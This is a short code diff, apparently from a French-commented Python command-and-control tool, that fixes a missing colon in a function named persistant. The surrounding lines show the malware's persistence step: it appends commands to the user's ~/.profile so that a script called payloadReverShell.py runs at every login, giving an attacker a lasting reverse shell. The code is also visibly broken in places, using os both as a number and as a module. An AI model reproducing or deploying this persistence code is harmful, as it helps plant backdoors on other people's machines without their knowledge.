@@ -101,7 +101,7 @@ def candc():
 #écrire dans le profile pour persistant
 #def persistant():
 def persistant():
-    if os == 1
+    if os == 1:
         os.walk('~/.profile')
         createProgramme()
         cmd = "echo  \n 'if [ -r payloadReverShell\.py] ; then' \n \v 'python3 payloadReverShell\.py' \n 'fi'  >> ~/.profile "
